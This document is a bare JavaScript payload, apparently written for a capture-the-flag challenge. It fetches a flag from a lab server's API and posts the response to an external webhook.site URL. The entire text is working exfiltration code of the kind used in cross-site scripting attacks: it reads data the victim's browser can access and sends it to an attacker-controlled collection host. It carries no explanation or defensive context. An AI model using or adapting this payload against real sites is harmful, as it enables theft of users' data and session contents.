fetch('http://ctf.hackerlab.bj:5700/api/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://webhook.site/d7728677-d8a7-4410-bc60-0f6320a74a1e', {
      method: 'POST',
      mode: 'no-cors',
      body: flag
    });
  });

